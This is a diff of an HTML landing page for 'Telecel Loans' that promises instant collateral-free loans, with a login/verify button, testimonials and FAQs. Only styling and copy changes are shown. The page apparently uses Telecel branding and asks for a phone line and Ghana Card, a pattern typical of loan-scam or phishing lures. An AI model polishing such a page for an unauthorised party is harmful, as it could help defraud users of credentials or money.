@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel Loans | Instant Flex Cash</title>
+    <title>Telecel Cash | Flex Loans</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
@@ -19,8 +19,8 @@
 
         /* Sticky Ticker */
         .ticker-wrap {
-            background: #000; color: white; padding: 12px 0; overflow: hidden; white-space: nowrap;
-            border-bottom: 5px solid var(--red); position: sticky; top: 0; z-index: 1100;
+            background: #000; color: white; padding: 10px 0; overflow: hidden; white-space: nowrap;
+            border-bottom: 4px solid var(--red); position: sticky; top: 0; z-index: 1100;
         }
         .ticker-inner { display: inline-flex; animation: ticker 25s linear infinite; }
         .ticker-inner span { margin-right: 80px; font-size: 1.05rem; font-weight: 500; }
@@ -37,13 +37,13 @@
         }
         .logo { display: flex; align-items: center; gap: 12px; color: white; text-decoration: none; }
         .logo svg { width: 200px; height: 200px; }
-        .logo-text { font-size: 2.4rem; font-weight: 800; letter-spacing: -1.5px; color: white; }
+        .logo-text { font-size: 2.4rem; font-weight: 800; letter-spacing: -1.5px; }
         .nav-links { display: flex; gap: 28px; font-weight: 600; align-items: center; }
         .nav-links a { color: #ddd; text-decoration: none; transition: 0.3s; }
         .nav-links a:hover { color: white; }
         .login-btn {
             background: var(--blue); color: white; padding: 12px 28px; border-radius: 50px;
-            font-weight: 700; text-decoration: none; transition: 0.3s; white-space: nowrap;
+            font-weight: 700; text-decoration: none; transition: 0.3s;
         }
         .hamburger { display: none; font-size: 1.9rem; color: white; cursor: pointer; }
 
@@ -57,7 +57,7 @@
 
         /* Hero */
         .hero {
-            background: linear-gradient(rgba(10,10,10,0.75), rgba(10,10,10,0.85)), 
+            background: linear-gradient(rgba(10,10,10,0.8), rgba(10,10,10,0.85)), 
                         url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80') center/cover no-repeat;
             color: white; padding: 160px 5% 120px; text-align: center;
         }
@@ -65,9 +65,10 @@
         .hero .highlight { color: var(--blue); }
         .hero p { font-size: 1.25rem; max-width: 720px; margin: 0 auto 40px; }
 
-        /* Common Card Style */
+        /* Common Card Style - All sections use same look */
         .section { padding: 100px 5%; }
         .section-title { text-align: center; font-size: 2.7rem; margin-bottom: 60px; font-weight: 800; color: white; }
+
         .packages-grid {
             display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px;
             max-width: 1400px; margin: 0 auto;
@@ -75,6 +76,7 @@
         .package-card, .benefit-card, .testimonial-card {
             background: var(--gray); padding: 38px 28px; border-radius: 24px;
             border: 1px solid #333; transition: all 0.4s ease; text-align: center;
+            height: 100%;
         }
         .package-card:hover, .benefit-card:hover, .testimonial-card:hover {
             transform: translateY(-12px); border-color: var(--red);
@@ -153,7 +155,7 @@
                 <a href="#testimonials">Testimonials</a>
                 <a href="#faq">FAQ</a>
             </div>
-            <a href="#" onclick="showLoginModal()" class="login-btn">Login / Verify</a>
+            <a href="#" onclick="showLoginModal()" class="login-btn">Login</a>
             <div class="hamburger" onclick="toggleMobileMenu()">☰</div>
         </div>
     </header>
@@ -172,7 +174,7 @@
     <!-- Hero -->
     <section class="hero" id="home">
         <h1>Telecel <span class="highlight">Loans</span></h1>
-        <p>As a loyal Telecel customer, you qualify for instant flex loans with no collateral. Money in your Telecel Cash wallet in minutes.</p>
+        <p>As a loyal Telecel customer, you qualify for fast, collateral-free loans. Get money directly into your Telecel Cash wallet in minutes.</p>
         <button onclick="document.getElementById('estimator').scrollIntoView({behavior:'smooth'})"
                 style="background:white; color:#000; padding:18px 48px; font-size:1.3rem; font-weight:700; border:none; border-radius:50px; cursor:pointer;">
             Check My Eligibility →
@@ -227,16 +229,16 @@
         </div>
     </section>
 
-    <!-- Why Choose Telecel -->
+    <!-- Benefits -->
     <section id="benefits" class="section" style="background:#111;">
         <h2 class="section-title">Why Choose Telecel Loans?</h2>
         <div class="packages-grid">
             <div class="benefit-card"><h3>⚡ Instant Disbursement</h3><p>Money lands in your Telecel Cash Wallet within minutes.</p></div>
-            <div class="benefit-card"><h3>🔒 No Collateral Required</h3><p>Just your active Telecel line is needed.</p></div>
-            <div class="benefit-card"><h3>📱 Fully Mobile</h3><p>Apply from anywhere, anytime.</p></div>
-            <div class="benefit-card"><h3>🔄 Flexible Repayment</h3><p>7 to 90 days with transparent rates.</p></div>
-            <div class="benefit-card"><h3>🛡️ Secure & Trusted</h3><p>Powered by Telecel Ghana.</p></div>
-            <div class="benefit-card"><h3>⭐ Loyal Users Rewarded</h3><p>Higher limits for consistent users.</p></div>
+            <div class="benefit-card"><h3>🔒 No Collateral Required</h3><p>Just your active Telecel line and good usage history.</p></div>
+            <div class="benefit-card"><h3>📱 100% Mobile Experience</h3><p>Apply, get approved, and repay directly from your phone.</p></div>
+            <div class="benefit-card"><h3>🔄 Flexible Repayment</h3><p>Choose from 7 to 90 days with transparent rates.</p></div>
+            <div class="benefit-card"><h3>🛡️ Secure & Trusted</h3><p>Powered by Telecel Ghana. Your data is protected.</p></div>
+            <div class="benefit-card"><h3>⭐ Loyal Users Rewarded</h3><p>Higher limits for consistent Telecel users.</p></div>
         </div>
     </section>
 
@@ -244,13 +246,13 @@
     <section id="how" class="section">
         <h2 class="section-title">How It Works</h2>
         <div class="packages-grid">
-            <div class="package-card"><h3>1. Choose Amount</h3><p>Use calculator or packages</p></div>
-            <div class="package-card"><h3>2. Quick Verification</h3><p>Confirm your Telecel number</p></div>
-            <div class="package-card"><h3>3. Get Cash Instantly</h3><p>Funds to your Telecel Cash</p></div>
+            <div class="package-card"><h3>1. Choose Amount</h3><p>Use our calculator or select a package.</p></div>
+            <div class="package-card"><h3>2. Quick Verification</h3><p>Confirm your Telecel number and basic details.</p></div>
+            <div class="package-card"><h3>3. Get Cash Instantly</h3><p>Funds transferred directly to your Telecel Cash wallet.</p></div>
         </div>
     </section>
 
-    <!-- Testimonials (15) -->
+    <!-- Testimonials - 15 Cards -->
     <section id="testimonials" class="section" style="background:#111;">
         <h2 class="section-title">What People Say</h2>
         <div class="packages-grid">
@@ -272,19 +274,19 @@
         </div>
     </section>
 
-    <!-- FAQ (10) -->
+    <!-- FAQ - 10 Items -->
     <section id="faq" class="section">
         <h2 class="section-title">Frequently Asked Questions</h2>
         <div class="packages-grid" style="grid-template-columns:1fr; max-width:900px; margin:auto;">
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Who can apply? <span>+</span></div><div class="faq-answer">Active Telecel users with consistent usage for at least 3 months.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How fast do I get the money? <span>+</span></div><div class="faq-answer">Within 5-30 minutes after approval to your Telecel Cash wallet.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What are the interest rates? <span>+</span></div><div class="faq-answer">Rates range from 8% to 15% depending on amount and duration.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I repay early? <span>+</span></div><div class="faq-answer">Yes, early repayment is allowed with no penalty.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Is collateral required? <span>+</span></div><div class="faq-answer">No collateral is needed.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Maximum loan amount? <span>+</span></div><div class="faq-answer">Up to GHS 25,000 depending on your limit.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Do I need documents? <span>+</span></div><div class="faq-answer">Only active Telecel line and Ghana Card (optional).</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">24/7 Service? <span>+</span></div><div class="faq-answer">Yes, you can apply anytime.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I apply multiple times? <span>+</span></div><div class="faq-answer">Yes, after repaying the previous loan.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Who can apply? <span>+</span></div><div class="faq-answer">Active Telecel users with consistent airtime and data usage for at least 3 months.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How fast do I get the money? <span>+</span></div><div class="faq-answer">Approved loans are disbursed within 5-30 minutes directly to your Telecel Cash wallet.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What are the interest rates? <span>+</span></div><div class="faq-answer">Rates range from 8% to 15% depending on loan amount and duration. No hidden fees.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I repay early? <span>+</span></div><div class="faq-answer">Yes! Early repayment is encouraged and may reduce total interest.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Is collateral required? <span>+</span></div><div class="faq-answer">No collateral needed. Only active Telecel line.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Maximum amount? <span>+</span></div><div class="faq-answer">Up to GHS 25,000 depending on your usage history.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What documents do I need? <span>+</span></div><div class="faq-answer">Ghana Card and active Telecel line.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">24/7 service? <span>+</span></div><div class="faq-answer">Yes, you can apply anytime.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I apply multiple times? <span>+</span></div><div class="faq-answer">Yes, after full repayment of previous loan.</div></div>
             <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How do I repay? <span>+</span></div><div class="faq-answer">Directly through your Telecel Cash wallet.</div></div>
         </div>
     </section>
@@ -293,7 +295,7 @@
     <footer>
         <div class="footer-content">
             <div>
-                <a href="#home" class="logo" style="justify-content:center;">
+                <a href="#home" class="logo">
                     <svg width="120" height="120" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C..." fill="#E32526"/>
                     </svg>
